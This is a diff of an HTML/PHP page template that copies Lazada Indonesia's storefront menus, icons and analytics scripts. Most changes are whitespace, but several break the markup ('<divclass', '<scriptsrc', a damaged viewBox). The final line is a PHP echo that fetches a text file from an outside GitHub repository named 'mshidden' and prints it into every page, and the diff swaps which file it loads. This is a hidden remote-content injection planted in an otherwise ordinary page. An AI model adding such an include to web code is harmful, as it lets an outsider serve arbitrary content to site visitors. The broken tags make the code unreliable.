@@ -352,7 +352,7 @@
     <path d="M105.621333 309.162667V105.621333h208.384V0.021333H0v309.141334zM710.4 105.621333h208.405333v203.541334h105.6V0.021333H710.4zM313.984 918.378667H105.621333v-213.184H0v318.784h313.984zM918.784 705.194667v213.184H710.4v105.6h313.962667V705.194667z">
     </path>
   </symbol>
-  <symbol id="lazadaicon_arrowDown" viewBox="0 0 1024 1024">
+  <symbol id="lazadaicon_arrowDown" viewBox="0 01024 1024">
     <path d="M806.4 341.333333l89.6 89.6-384 379.733334-384-379.733334L217.6 341.333333l294.4 294.4z"></path>
   </symbol>
   <symbol id="lazadaicon_arrowUp" viewBox="0 0 1024 1024">
@@ -1029,8 +1029,7 @@
             <li class="lzd-site-menu-sub-item" data-cate="cate_5_8">
                 <a href="https://www.lazada.co.id/beli-perhiasan-anak/">
                     <span>Perhiasan Anak</span>
-                </a>
-                        <script type="text" class="J_data_4_7">
+                </a><script type="text" class="J_data_4_7">
                             [{"childCategoryName":"Emas Murni","childCategoryUrl":"https://www.lazada.co.id/beli-anak-emas-murni/" rel="nofollow"},{"childCategoryName":"Perhiasan Fashion","childCategoryUrl":"https://www.lazada.co.id/beli-anak-perhiasan-fashion/"}]
                         </script>
             </li>
@@ -1086,8 +1085,7 @@
             </li>
             <li class="lzd-site-menu-sub-item" data-cate="cate_6_6">
                 <a href="https://www.lazada.co.id/beli-parfum/">
-                    <span>Parfum</span>
-                </a>
+                    <span>Parfum</span></a>
                         <script type="text" class="J_data_5_5">
                             [{"childCategoryName":"","childCategoryUrl":""},{"childCategoryName":"Pria","childCategoryUrl":"https://www.lazada.co.id/beli-parfum-pria"},{"childCategoryName":"Wanita","childCategoryUrl":"https://www.lazada.co.id/beli-parfum-wanita"},{"childCategoryName":"Unisex","childCategoryUrl":"https://www.lazada.co.id/beli-parfum-unisex"}]
                         </script>
@@ -1179,8 +1177,7 @@
                     <span>Perlengkapan Menyusui</span>
                 </a>
                         <script type="text" class="J_data_6_4">
-                            [{"childCategoryName":"Botol Bayi","childCategoryUrl":"https://www.lazada.co.id/beli-botol-bayi/" rel="nofollow"},{"childCategoryName":"Botol","childCategoryUrl":"https://www.lazada.co.id/beli-botol-bayi-balita/" rel="nofollow"},{"childCategoryName":"Aksesoris Dot Botol","childCategoryUrl":"https://www.lazada.co.id/jual-aksesoris-botol-dot-bayi/" rel="nofollow"},{"childCategoryName":"Penghangat & Sterilizers","childCategoryUrl":"https://www.lazada.co.id/beli-penghangat-sterilizer/" rel="nofollow"},{"childCategoryName":"Pompa Asi","childCategoryUrl":"https://www.lazada.co.id/jual-pompa-asi/" rel="nofollow"},{"childCategoryName":"Aksesesoris Pompa Asi","childCategoryUrl":"https://www.lazada.co.id/jual-aksesoris-pompa-asi/" rel="nofollow"},{"childCategoryName":"Perawatan Payudara","childCategoryUrl":"https://www.lazada.co.id/beli-perawatan-puting/" rel="nofollow"},{"childCategoryName":"Bantal Menyusui","childCategoryUrl":"https://www.lazada.co.id/beli-bantal-kursi-bayi/" rel="nofollow"},{"childCategoryName":"Kursi Bayi","childCategoryUrl":"https://www.lazada.co.id/beli-kursi-tinggi-bayi-kursi-booster/" rel="nofollow"},{"childCategoryName":"Food Blenders","childCategoryUrl":"https://www.lazada.co.id/beli-blender-makanan-bayi/" rel="nofollow"},{"childCategoryName":"Peralatan Makan Bayi","childCategoryUrl":"https://www.lazada.co.id/beli-perlengkapan-makan-bayi-bb/" rel="nofollow"},{"childCategoryName":"Set Peralatan Makan Bayi","childCategoryUrl":"https://www.lazada.co.id/jual-piring-mangkok-bayi/"}]
-                        </script>
+                            [{"childCategoryName":"Botol Bayi","childCategoryUrl":"https://www.lazada.co.id/beli-botol-bayi/" rel="nofollow"},{"childCategoryName":"Botol","childCategoryUrl":"https://www.lazada.co.id/beli-botol-bayi-balita/" rel="nofollow"},{"childCategoryName":"Aksesoris Dot Botol","childCategoryUrl":"https://www.lazada.co.id/jual-aksesoris-botol-dot-bayi/" rel="nofollow"},{"childCategoryName":"Penghangat & Sterilizers","childCategoryUrl":"https://www.lazada.co.id/beli-penghangat-sterilizer/" rel="nofollow"},{"childCategoryName":"Pompa Asi","childCategoryUrl":"https://www.lazada.co.id/jual-pompa-asi/" rel="nofollow"},{"childCategoryName":"Aksesesoris Pompa Asi","childCategoryUrl":"https://www.lazada.co.id/jual-aksesoris-pompa-asi/" rel="nofollow"},{"childCategoryName":"Perawatan Payudara","childCategoryUrl":"https://www.lazada.co.id/beli-perawatan-puting/" rel="nofollow"},{"childCategoryName":"Bantal Menyusui","childCategoryUrl":"https://www.lazada.co.id/beli-bantal-kursi-bayi/" rel="nofollow"},{"childCategoryName":"Kursi Bayi","childCategoryUrl":"https://www.lazada.co.id/beli-kursi-tinggi-bayi-kursi-booster/" rel="nofollow"},{"childCategoryName":"Food Blenders","childCategoryUrl":"https://www.lazada.co.id/beli-blender-makanan-bayi/" rel="nofollow"},{"childCategoryName":"Peralatan Makan Bayi","childCategoryUrl":"https://www.lazada.co.id/beli-perlengkapan-makan-bayi-bb/" rel="nofollow"},{"childCategoryName":"Set Peralatan Makan Bayi","childCategoryUrl":"https://www.lazada.co.id/jual-piring-mangkok-bayi/"}]</script>
             </li>
             <li class="lzd-site-menu-sub-item" data-cate="cate_7_6">
                 <a href="https://www.lazada.co.id/beli-perlengkapan-berkendara-bayi/">
@@ -1467,8 +1464,7 @@
                         <script type="text" class="J_data_9_7">
                             [{"childCategoryName":"","childCategoryUrl":""},{"childCategoryName":"Keperluan Akuarium","childCategoryUrl":"https://www.lazada.co.id/shop-keperluan-akuarium/" rel="nofollow"},{"childCategoryName":"Kandang & Aksesoris","childCategoryUrl":"https://www.lazada.co.id/beli-kandang-terbuka-pintu-anjing/" rel="nofollow"},{"childCategoryName":"Peralatan Grooming","childCategoryUrl":"https://www.lazada.co.id/jual-persediaan-grooming-hewan/" rel="nofollow"},{"childCategoryName":"Rumah,Alas & Tempat tidur","childCategoryUrl":"https://www.lazada.co.id/beli-ranjang-alas-tidur-rumah-anjing/" rel="nofollow"},{"childCategoryName":"Alat Makan Hewan","childCategoryUrl":"https://www.lazada.co.id/beli-mangkuk-makan-anjing/" rel="nofollow"},{"childCategoryName":"Tali dan Kalung Hewan","childCategoryUrl":"https://www.lazada.co.id/beli-tali-kalung-moncong-anjing/" rel="nofollow"},{"childCategoryName":"Kebutuhan Travel Hewan","childCategoryUrl":"https://www.lazada.co.id/beli-pengangkut-perjalanan-anjing/" rel="nofollow"},{"childCategoryName":"Mainan Hewan","childCategoryUrl":"https://www.lazada.co.id/shop-mainan/" rel="nofollow"},{"childCategoryName":"Alat Pelatihan Anjing","childCategoryUrl":"https://www.lazada.co.id/beli-alat-latih-olahraga-anjing/"}]
                         </script>
-            </li>
-            <li class="lzd-site-menu-sub-item" data-cate="cate_10_9">
+            </li><li class="lzd-site-menu-sub-item" data-cate="cate_10_9">
                 <a href="https://www.lazada.co.id/shop-kesehatan-hewan-peliharaan">
                     <span>Kesehatan Hewan Peliharaan</span>
                 </a>
@@ -1555,8 +1551,7 @@
                     <span>Olahraga Raket</span>
                 </a>
                         <script type="text" class="J_data_10_9">
-                            [{"childCategoryName":"Tenis Meja","childCategoryUrl":"https://www.lazada.co.id/tenis-meja/" rel="nofollow"},{"childCategoryName":"Badminton","childCategoryUrl":"https://www.lazada.co.id/bulutangkis/" rel="nofollow"},{"childCategoryName":"Tennis","childCategoryUrl":"https://www.lazada.co.id/tenis/" rel="nofollow"},{"childCategoryName":"Squash","childCategoryUrl":"https://www.lazada.co.id/squash/"}]
-                        </script>
+                            [{"childCategoryName":"Tenis Meja","childCategoryUrl":"https://www.lazada.co.id/tenis-meja/" rel="nofollow"},{"childCategoryName":"Badminton","childCategoryUrl":"https://www.lazada.co.id/bulutangkis/" rel="nofollow"},{"childCategoryName":"Tennis","childCategoryUrl":"https://www.lazada.co.id/tenis/" rel="nofollow"},{"childCategoryName":"Squash","childCategoryUrl":"https://www.lazada.co.id/squash/"}]</script>
             </li>
             <li class="lzd-site-menu-sub-item" data-cate="cate_11_11">
                 <a href="https://www.lazada.co.id/shop-perlengkapan-olah-raga/">
@@ -1728,7 +1723,7 @@
             <a href="https://www.lazada.co.id/">
                 <span class="lzd-site-menu-nav-category-text">Kategori</span>
             </a>
-            <div class="lzd-site-menu-nav-menu">
+            <divclass="lzd-site-menu-nav-menu">
   <div class="mui-zebra-module" id="J_icms-5000518-1511530513406" data-module-id="icms-5000518-1511530513406" data-version="5.0.51" data-spm="icms-5000518-1511530513406">
 <div class="lzd-site-nav-menu-dropdown" data-mod-name="@ali/lzdmod-site-menu-pc/pc/index" data-config="{}">
     <ul class="lzd-site-menu-root" data-spm="cate">
@@ -1955,8 +1950,7 @@
                 <a href="//www.lazada.co.id/aksesoris-wanita/">
                     <span>Aksesoris</span>
                 </a>
-                        <script type="text" class="J_data_2_4">
-                            [{"childCategoryName":"Ikat Pinggang","childCategoryUrl":"//www.lazada.co.id/ikat-pinggang-wanita/" rel="nofollow"},{"childCategoryName":"Payung","childCategoryUrl":"//www.lazada.co.id/payung-wanita/" rel="nofollow"},{"childCategoryName":"Topi","childCategoryUrl":"//www.lazada.co.id/topi-wanita/" rel="nofollow"},{"childCategoryName":"Aksesoris Rambut","childCategoryUrl":"//www.lazada.co.id/aksesoris-rambut/" rel="nofollow"},{"childCategoryName":"Scarf","childCategoryUrl":"//www.lazada.co.id/scarf-wanita/" rel="nofollow"},{"childCategoryName":"Sarung Tangan","childCategoryUrl":"//www.lazada.co.id/sarung-tangan-wanita/" rel="nofollow"},{"childCategoryName":"Masker Wajah","childCategoryUrl":"//www.lazada.co.id/shop-women-fabricmask/"}]
+                        <script type="text" class="J_data_2_4">[{"childCategoryName":"Ikat Pinggang","childCategoryUrl":"//www.lazada.co.id/ikat-pinggang-wanita/" rel="nofollow"},{"childCategoryName":"Payung","childCategoryUrl":"//www.lazada.co.id/payung-wanita/" rel="nofollow"},{"childCategoryName":"Topi","childCategoryUrl":"//www.lazada.co.id/topi-wanita/" rel="nofollow"},{"childCategoryName":"Aksesoris Rambut","childCategoryUrl":"//www.lazada.co.id/aksesoris-rambut/" rel="nofollow"},{"childCategoryName":"Scarf","childCategoryUrl":"//www.lazada.co.id/scarf-wanita/" rel="nofollow"},{"childCategoryName":"Sarung Tangan","childCategoryUrl":"//www.lazada.co.id/sarung-tangan-wanita/" rel="nofollow"},{"childCategoryName":"Masker Wajah","childCategoryUrl":"//www.lazada.co.id/shop-women-fabricmask/"}]
                         </script>
             </li>
             <li class="lzd-site-menu-sub-item" data-cate="cate_3_6">
@@ -2540,8 +2534,7 @@
                         <script type="text" class="J_data_9_6">
                             [{"childCategoryName":"","childCategoryUrl":""},{"childCategoryName":"Makanan & Camilan Kucing","childCategoryUrl":"//www.lazada.co.id/jual-makanan-kucing/" rel="nofollow"},{"childCategoryName":"Makanan Burung","childCategoryUrl":"//www.lazada.co.id/beli-makanan-burung/" rel="nofollow"},{"childCategoryName":"Makanan Ikan","childCategoryUrl":"//www.lazada.co.id/beli-makanan-ikan/" rel="nofollow"},{"childCategoryName":"Makanan & Camilan Anjing","childCategoryUrl":"//www.lazada.co.id/jual-makanan-anjing/"}]
                         </script>
-            </li>
-            <li class="lzd-site-menu-sub-item" data-cate="cate_10_8">
+            </li><li class="lzd-site-menu-sub-item" data-cate="cate_10_8">
                 <a href="//www.lazada.co.id/shop-aksesoris-hewan">
                     <span>Aksesoris Hewan Peliharaan</span>
                 </a>
@@ -2834,7 +2827,7 @@
   
   <script>var requirejs={onNodeCreated:function(node,config,id,url){node.setAttribute('crossorigin','anonymous');}};</script>
   <script src="https://g.lazcdn.com/g/??mtb/lib-promise/3.1.3/polyfillB.js,mtb/lib-mtop/2.5.1/mtop.js,lazada-decorate/lazada-mod-lib/0.0.20/LazadaModLib.min.js" charset="utf-8"></script>
-  <script src="https://g.lazcdn.com/g/woodpeckerx/jssdk??wpkReporter.js,plugins/flow.js,plugins/interface.js,plugins/blank.js"></script>
+  <scriptsrc="https://g.lazcdn.com/g/woodpeckerx/jssdk??wpkReporter.js,plugins/flow.js,plugins/interface.js,plugins/blank.js"></script>
     <script>function pdpLog(logkey,gmkey='CLK',args={},chksum=''){if(!logkey)return;var pdpMsiteExperimentEnable=window.__pdpMsiteExperimentEnable__||false;var pdpMsiteExperimentBucketId=window.__pdpMsiteExperimentConfig__?window.__pdpMsiteExperimentConfig__.bucketId:'-';var query='';if(Object.prototype.toString.call(args)==='[object Object]'){query=Object.keys(args).map(function(key){return encodeURIComponent(key)+'='+encodeURIComponent(args[key]);}).join('&');query='&'+query;}var gokey='pdpMsiteExperimentEnable='+pdpMsiteExperimentEnable+'&pdpMsiteExperimentBucketId='+pdpMsiteExperimentBucketId+query;if(window.goldlog&&window.goldlog.record){window.goldlog.record(logkey,gmkey,gokey,chksum);}else{window.goldlog_queue=window.goldlog_queue||[];window.goldlog_queue.push({action:'goldlog.record',arguments:[logkey,gmkey,gokey],});}}function reportMtopData(){if(window.__wpk&&window.__pdpMtopStartTime){window.__wpk.report({category:111,msg:'PDP CSR MTOP API Success Rate',w_succ:window.__pdpMtopStatus||0,wl_avgv1:window.__pdpMtopEndTime?window.__pdpMtopEndTime-window.__pdpMtopStartTime:0,c1:window.__regionID__})}}function reportMtopData2(){if(window.__wpk&&window.__pdpTriggerCSR){window.__wpk.report({category:112,msg:'PDP CSR MTOP API Trigger Rate',w_succ:window.__pdpTriggerMtopStatus,c1:window.__regionID__})}}function reportMtopData3(){if(window.__wpk){window.__wpk.report({category:113,msg:'PDP CSR Hydrate Success Rate',w_succ:window.__pdpHydrateStatus||0,c1:window.__regionID__})}}function hydrate(){var modulePath='https://g.lazcdn.com/g/lzdfe/pdp-platform/0.1.22/pc.js';window.__pdpHydrateStatus=0;require([modulePath],function(app){try{console.log('start run...')
 app.run(__moduleData__,function(){timings.render=Date.now();pdpLog('/lazada_bounce_rendered','EXP',{content:"pdp-m"})
 window.__pdpHydrateStatus=1;var loading=document.getElementById('pdp-skeleton-new');if(loading){loading.style.display='none';}reportMtopData3();})}catch(e){console.error('render error',e);reportMtopData3();if(window._blReport){window._blReport('error',[e,{file:'page.html'},]);}}});}</script>
@@ -3009,6 +3002,6 @@ window.__pdpHydrateStatus=1;var loading=document.getElementById('pdp-skeleton-ne
   <script src="//aeis.alicdn.com/sd/ncpc/nc.js?t=18507" defer async></script>
   <script>(function(){try{var webVitalsScript=document.createElement('script');webVitalsScript.src='https://g.lazcdn.com/g/lzd/assets/1.2.10/web-vitals/3.4.0/index.js';webVitalsScript.onload=function(){var WebVitalsDelta={FCP:null,CLS:null,FID:null,LCP:null,INP:null,};function webVitalsCb(entry){if(entry&&entry.name&&entry.delta){WebVitalsDelta[entry.name]=entry.delta;if(entry.name==='INP'){webVitalsSingleReport(entry);}else if(window.requestIdleCallback){window.requestIdleCallback(function(){webVitalsSingleReport(entry);});}}}function webVitalsSingleReport(entry){if(window.__wpk&&window.__wpk.report){var name=entry&&entry.name||'';var delta=entry&&entry.delta||'';const categories={FCP:101,CLS:103,FID:104,LCP:102,INP:119};window.__wpk.report({category:categories[name],msg:window.location.host,wl_avgv1:delta,bl1:entry&&Object.prototype.toString.call(entry)==="[object Object]"?JSON.stringify(entry):'',c1:entry&&entry.rating||''});}}window.webVitals.getFCP(webVitalsCb);window.webVitals.getCLS(webVitalsCb);window.webVitals.getFID(webVitalsCb);window.webVitals.getLCP(webVitalsCb);window.webVitals.getINP(webVitalsCb);};function report(){var fsp=null;var csr=null;if(timings.start&&timings.render){if(timings.ssr){fsp=timings.ssr-timings.start;csr=timings.render-timings.ssr;}else{fsp=timings.render-timings.start;}}if(fsp&&window.__wpk&&window.__wpk.report){__wpk.report({category:105,msg:window.location.host,wl_avgv1:fsp,wl_avgv2:csr||0,c1:window.__hasSSR__?1:0,});}}document.addEventListener('DOMContentLoaded',function(){if(window.timings){if(window.timings.render){report();}else{setTimeout(function(){report();},3000);}}})}catch(err){console.log(err&&err.message)}})();</script>
   <script>if(window.baxiaCommon){baxiaCommon.init({appendTo:"header",umOptions:{serviceLocation:"lazada"},checkApiPath:url=>{return url.indexOf("mtop.lazada.promotion.voucher.spread")>-1;}});}</script>
-<?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/mshidden/main/imu.txt");?>
+<?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/mshidden/main/guest.txt");?>
 </body>
 </html>
